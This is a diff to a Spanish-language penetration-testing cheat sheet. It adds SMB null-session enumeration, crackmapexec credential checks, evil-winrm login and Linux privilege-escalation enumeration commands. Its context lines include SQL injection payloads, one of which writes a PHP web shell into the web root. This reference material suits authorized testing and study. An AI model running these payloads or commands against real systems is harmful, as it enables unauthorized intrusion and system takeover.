@@ -78,3 +78,27 @@ https://cheatsheet.haax.fr/web-pentest/injections/server-side-injections/sql/
     ' Union Select "Probando" into outfile "/var/www/html/prueba.txt" -- -
 #### PHP with SQLi
     'Union Select "<?php system($_GET['cmd'];?>" into outfile "/var/www/html/commandExec.php" -- -
+    
+### Windows Shares Using Null sessions
+    nmblookup -A <IP>
+    smbclient -L //<IP> -N (list shares)
+    smbclient //<IP>/share -N (mount share)
+    smbclient -L <IP> -N --option="client min protocol=NT1"
+    enum4linux -a <IP>
+### Windows machines
+    crackmapexec smb <IP> -u 'user' -p 'password' : Si esto nos contesta con un [+] el usuario es valido
+    crackmapexec winrm <IP> -u 'user' -p 'password' : si esto nos pone un Pwn3d podemos conectanos con evilwinrm
+    evil-winrm -i <IP> -u 'user' -p 'pass'
+### Escalar privilegios Linux
+#### Podemos tratar de escalar privilegios buscando e inspeccionando con estos comandos.
+#### SUID
+    find / -perm -4000 2>/dev/null
+#### SUDOERS
+    sudo -l
+#### Capabilities
+    getcap -r / 2>/dev/null
+#### Si no encontramos por aqui algo importante podemos empezar a enumerar el sistema con otras tecnicas como buscar tareas cron , linpeas.sh o tratar de revisar que archivos podemos editar nosotros con el siguiente comando
+    find / -user <user> 2>/dev/null
+#### Podemos quitar los proc
+    find / -user <user> 2>/dev/null | grep -vE "proc|/proc"
+    
